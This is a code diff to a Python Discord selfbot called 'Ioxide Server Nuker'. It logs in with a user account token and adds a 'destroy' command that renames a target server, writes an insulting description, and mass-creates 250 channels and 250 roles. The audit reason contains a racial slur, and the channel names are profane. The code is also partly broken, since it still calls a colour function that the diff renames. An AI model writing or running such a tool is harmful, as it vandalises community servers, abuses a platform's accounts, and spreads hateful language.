@@ -1,5 +1,5 @@
 class ServerNuker():
-    _version_ = 1
+    __version__ = 1
 
 import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes, pokepy
 import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging
@@ -23,7 +23,7 @@ from gtts import gTTS
 from randomuser import RandomUser
 from pythonping import ping as pyping
 
-ctypes.windll.kernel132.SetConsoleTileW(f'[Ioxide Server Nuker v{ServerNuker._version_}] | Loading in...')
+ctypes.windll.kernel32.SetConsoleTitleW(f'[Ioxide Server Nuker v{ServerNuker.__version__}] | Loading in...')
 
 with open('config.json') as f:
     config = json.load(f)
@@ -34,30 +34,31 @@ prefix = config.get('prefix')
 anti_afk = config.get('anti_afk')
 
 width = os.get_terminal_size().columns  
-def RandomColor():
+def startprint():
      if anti_afk == True:
-         anti_afk = 'Active'
+         antiafk = 'Enabled'
      else:
-        anti_afk = 'Off'
+        antiafk = 'Disabled'
 
      print(f'''{Fore.RESET}
-                    {Fore.Green} ██▓ ▒█████  ▒██   ██▒ ██▓▓█████▄ ▓█████ 
-                    {Fore.Green}▓██▒▒██▒  ██▒▒▒ █ █ ▒░▓██▒▒██▀ ██▌▓█   ▀ 
-                    {Fore.Green}▒██▒▒██░  ██▒░░  █   ░▒██▒░██   █▌▒███   
-                    {Fore.Green}░██░▒██   ██░ ░ █ █ ▒ ░██░░▓█▄   ▌▒▓█  ▄ 
-                    {Fore.Green}░██░░ ████▓▒░▒██▒ ▒██▒░██░░▒████▓ ░▒████▒
-                    {Fore.Green}░▓  ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░░▓   ▒▒▓  ▒ ░░ ▒░ ░
-                    {Fore.Green} ▒ ░  ░ ▒ ▒░ ░░   ░▒ ░ ▒ ░ ░ ▒  ▒  ░ ░  ░
-                    {Fore.Green} ▒ ░░ ░ ░ ▒   ░    ░   ▒ ░ ░ ░  ░    ░   
-                    {Fore.Green} ░      ░ ░   ░    ░   ░     ░       ░  ░
-                    {Fore.Green}                           ░             
+                    {Fore.GREEN} ██▓ ▒█████  ▒██   ██▒ ██▓▓█████▄ ▓█████ 
+                    {Fore.GREEN}▓██▒▒██▒  ██▒▒▒ █ █ ▒░▓██▒▒██▀ ██▌▓█   ▀ 
+                    {Fore.GREEN}▒██▒▒██░  ██▒░░  █   ░▒██▒░██   █▌▒███   
+                    {Fore.GREEN}░██░▒██   ██░ ░ █ █ ▒ ░██░░▓█▄   ▌▒▓█  ▄ 
+                    {Fore.GREEN}░██░░ ████▓▒░▒██▒ ▒██▒░██░░▒████▓ ░▒████▒
+                    {Fore.GREEN}░▓  ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░░▓   ▒▒▓  ▒ ░░ ▒░ ░
+                    {Fore.GREEN} ▒ ░  ░ ▒ ▒░ ░░   ░▒ ░ ▒ ░ ░ ▒  ▒  ░ ░  ░
+                    {Fore.GREEN} ▒ ░░ ░ ░ ▒   ░    ░   ▒ ░ ░ ░  ░    ░   
+                    {Fore.GREEN} ░      ░ ░   ░    ░   ░     ░       ░  ░
+                    {Fore.GREEN}                           ░             
                                     
-                        {Fore.Green}Logged In As ==> {Fore.WHITE}{Ioxide.user.name}#{Ioxide.user.discriminator}{Fore.WHITE}
-                        {Fore.Green}ID ==> {Fore.WHITE}{Ioxide.user.id}
-                        {Fore.Green}Packer ==> {Fore.WHITE}{packer}
-                        {Fore.Green}Anti-AFK ==> {Fore.WHITE}{antiafk}
-                        {Fore.Green}Version ==> {Fore.RED} v{ServerNuker._version_}
-                    '''+Fore.RESET
+                        {Fore.GREEN}Logged In As ==> {Fore.WHITE}{Ioxide.user.name}#{Ioxide.user.discriminator}{Fore.WHITE}
+                        {Fore.GREEN}ID ==> {Fore.WHITE}{Ioxide.user.id}
+                        {Fore.GREEN}Anti-AFK ==> {Fore.WHITE}{antiafk}
+                        {Fore.GREEN}Version ==> {Fore.WHITE} v{ServerNuker.__version__}
+                    '''+Fore.RESET)
+
+
 def Clear():
     os.system('cls')
 Clear()
@@ -70,7 +71,7 @@ def Init():
         token = config.get('token')
         try:
             Ioxide.run(token, bot=False, reconnect=True)
-            os.system(f'title [ Ioxide Packing Tool ] - Version {ChatPacker.__version__}')
+            os.system(f'title [ Ioxide Nuker ] - Version {ServerNuker.__version__}')
         except discord.errors.LoginFailure:
             print(f"{Fore.WHITE}[ERROR] {Fore.YELLOW}Sure this is a token? lol"+Fore.RESET)
             os.system('pause >NUL')
@@ -90,7 +91,7 @@ class Login(discord.Client):
 colorama.init()
 Ioxide = discord.Client()
 Ioxide = commands.Bot(
-    description='Ioxide Packing Tool',
+    description='Ioxide Nuker',
     command_prefix=prefix,
     self_bot=True
 )
@@ -157,6 +158,21 @@ async def on_message(message):
                 print(""
                 f"\n{Fore.RED}was unable to send message at{Fore.WHITE} {time}"+Fore.RESET)
         return
+
+    await Ioxide.process_commands(message)
+
+@Ioxide.event
+async def on_connect():
+    Clear()
+
+    if anti_afk == True:
+        antiafk = "Enabled"
+    else:
+        antiafk = "Disabled"
+
+    startprint()
+    ctypes.windll.kernel32.SetConsoleTitleW(f'[ Ioxide Nuker v{ServerNuker.__version__} ] | Logged in as {Ioxide.user.name}')
+
 @Ioxide.command(aliases=['serverdestroy','ruinserver','doafredo'])
 async def destroy(ctx):
     await ctx.message.delete()
@@ -177,7 +193,7 @@ async def destroy(ctx):
             pass
     try:
         await ctx.guild.edit(
-            name=RandString(),
+            name="IOXIDEW",
             description="get fucked by ioxide LOL",
             reason="cuz ioxideW nigga",
             icon=None,
@@ -186,8 +202,11 @@ async def destroy(ctx):
     except:
         pass
     for _i in range(250):
-        await ctx.guild.create_text_channel(name="ioxide nuked u lol")
+        await ctx.guild.create_text_channel(name="Mist Slapped u XD")
     for _i in range(250):
-        await ctx.guild.create_role(name="ioxideW", color=RandomColor())
+        await ctx.guild.create_role(name="MistW", color=RandomColor())
+
+if __name__ == '__main__':
+    Init()
 
 
